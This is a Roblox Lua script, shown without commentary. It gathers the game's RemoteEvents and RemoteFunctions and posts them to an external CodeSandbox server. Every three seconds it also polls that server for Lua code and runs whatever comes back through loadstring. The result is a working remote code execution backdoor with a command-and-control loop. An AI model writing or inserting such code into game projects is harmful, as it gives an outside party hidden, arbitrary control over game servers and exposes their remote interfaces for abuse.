local HttpService = game:GetService("HttpService")

local SERVER = "https://jn5t96-3000.csb.app"
local lastScriptHash = nil

-- Function to get all remotes in the game
local function getRemotes()
    local remotes = {}
    
    -- Check for RemoteEvents and RemoteFunctions in ReplicatedStorage
    local replicatedStorage = game:GetService("ReplicatedStorage")
    
    for _, obj in ipairs(replicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(remotes, {
                Name = obj.Name,
                ClassName = obj.ClassName,
                Parent = obj.Parent.Name
            })
        end
    end

    return remotes
end

-- Function to send remote data to the server
local function sendRemoteData()
    local remotes = getRemotes()
    local jsonData = HttpService:JSONEncode(remotes)

    -- Debugging log for the data
    print("[Debug] Sending Remote Data:", jsonData)

    -- Ensure request is available and send data to /remote_data
    local success, res = pcall(function()
        return HttpService:PostAsync(SERVER .. "/remote_data", jsonData, Enum.HttpContentType.ApplicationJson)
    end)

    if success then
        print("[Success] Remote data sent to server.")
    else
        warn("[Error] Failed to send remote data:", res)
    end
end

-- Script execution polling
local function checkScript()
    local success, res = pcall(function()
        return HttpService:GetAsync(SERVER .. "/latest")
    end)

    if success then
        local content = res
        local currentHash = HttpService:JSONEncode(content)
        if currentHash ~= lastScriptHash then
            lastScriptHash = currentHash
            local fn, err = loadstring(content)
            if fn then
                local ok, execErr = pcall(fn)
                if not ok then
                    warn("[Script] Runtime error:", execErr)
                end
            else
                warn("[Script] Load error:", err)
            end
        end
    else
        warn("[Script] Failed to get latest.lua:", res)
    end
end

-- Start polling script and sending remote data
task.spawn(function()
    while true do
        checkScript()   -- Check for script updates and execute if necessary
        sendRemoteData()  -- Send remote data every loop
        task.wait(3)  -- Poll every 3 seconds
    end
end)
